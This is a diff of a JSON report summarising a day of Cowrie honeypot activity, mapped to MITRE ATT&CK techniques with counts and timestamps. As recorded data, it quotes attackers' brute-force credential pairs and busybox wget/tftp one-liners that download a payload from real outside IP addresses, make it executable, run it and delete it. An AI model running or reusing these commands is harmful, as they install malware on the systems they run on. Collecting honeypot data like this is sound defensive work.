@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-22 05:04:36",
+  "generated": "2026-08-22 06:03:44",
   "totals": {
-    "commands": 542,
-    "login_failed": 1439,
-    "login_success": 29,
-    "sessions": 1333
+    "commands": 585,
+    "login_failed": 1515,
+    "login_success": 35,
+    "sessions": 1389
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1439,
+      "count": 1515,
       "examples": [
         "git / test123",
         "stef / stef",
@@ -21,14 +21,14 @@
         "sh\\x00 / /bin/busybox UNSTABLE\\x00"
       ],
       "first": "2026-08-22T00:00:03.842808Z",
-      "last": "2026-08-22T05:03:46.167271Z",
-      "unique_ips": 36
+      "last": "2026-08-22T06:03:20.089147Z",
+      "unique_ips": 41
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 29,
+      "count": 35,
       "examples": [
         "admin / 7ujMko0admin",
         "root / Zxic521",
@@ -37,30 +37,14 @@
         "admin / admin"
       ],
       "first": "2026-08-22T00:02:55.221938Z",
-      "last": "2026-08-22T04:59:28.353490Z",
-      "unique_ips": 24
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 26,
-      "examples": [
-        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
-        "http://2.26.136.128/twget.sh",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "http://185.93.89.72/wget",
-        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
-      ],
-      "first": "2026-08-22T01:09:41.651398Z",
-      "last": "2026-08-22T04:07:49.990848Z",
-      "unique_ips": 5
+      "last": "2026-08-22T06:03:21.659546Z",
+      "unique_ips": 29
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 21,
+      "count": 35,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -69,14 +53,30 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-08-22T01:09:41.651398Z",
-      "last": "2026-08-22T04:07:49.046963Z",
-      "unique_ips": 4
+      "last": "2026-08-22T06:03:27.368679Z",
+      "unique_ips": 6
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 29,
+      "examples": [
+        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
+        "http://2.26.136.128/twget.sh",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "http://185.93.89.72/wget",
+        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
+      ],
+      "first": "2026-08-22T01:09:41.651398Z",
+      "last": "2026-08-22T06:03:27.368679Z",
+      "unique_ips": 7
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 7,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
@@ -84,8 +84,21 @@
         "cat /etc/issue"
       ],
       "first": "2026-08-22T00:30:47.694179Z",
-      "last": "2026-08-22T04:59:31.944758Z",
-      "unique_ips": 5
+      "last": "2026-08-22T05:15:57.982972Z",
+      "unique_ips": 6
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 2,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-08-22T01:42:21.001937Z",
+      "last": "2026-08-22T06:03:27.368679Z",
+      "unique_ips": 2
     },
     {
       "id": "T1059.004",
@@ -101,18 +114,6 @@
       "unique_ips": 1
     },
     {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
-      ],
-      "first": "2026-08-22T01:42:21.001937Z",
-      "last": "2026-08-22T01:42:21.001937Z",
-      "unique_ips": 1
-    },
-    {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
@@ -122,6 +123,18 @@
       ],
       "first": "2026-08-22T03:41:12.598295Z",
       "last": "2026-08-22T03:41:12.598295Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1140",
+      "name": "Deobfuscate/Decode Files or Information",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox OJsFLmwM"
+      ],
+      "first": "2026-08-22T05:24:12.774101Z",
+      "last": "2026-08-22T05:24:12.774101Z",
       "unique_ips": 1
     },
     {
@@ -140,30 +153,34 @@
   "unmapped": [
     [
       "/bin/busybox",
-      418
+      421
     ],
     [
       "enable",
-      11
+      13
     ],
     [
       "system",
-      11
+      13
     ],
     [
       "shell",
-      11
+      13
     ],
     [
       "sh",
-      11
+      13
     ],
     [
       "linuxshell",
-      7
+      8
     ],
     [
       "/bin/busybox UNSTABLE",
+      4
+    ],
+    [
+      "ping ;sh",
       4
     ],
     [
@@ -175,7 +192,11 @@
       4
     ],
     [
-      "ping ;sh",
+      "enablelinuxshell",
+      3
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       3
     ],
     [
@@ -183,19 +204,15 @@
       3
     ],
     [
-      "enablelinuxshell",
-      2
+      "busybox",
+      3
+    ],
+    [
+      "/bin/busybox OJsFLmwM",
+      3
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      2
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      2
-    ],
-    [
-      "busybox",
       2
     ],
     [
@@ -212,10 +229,6 @@
     ],
     [
       "/bin/busybox echo > /var/tmp/.fxcat && sh /var/tmp/.fxcat && cd /var/tmp/",
-      1
-    ],
-    [
-      "/bin/busybox echo > /dev/.fxcat && sh /dev/.fxcat && cd /dev/",
       1
     ]
   ]
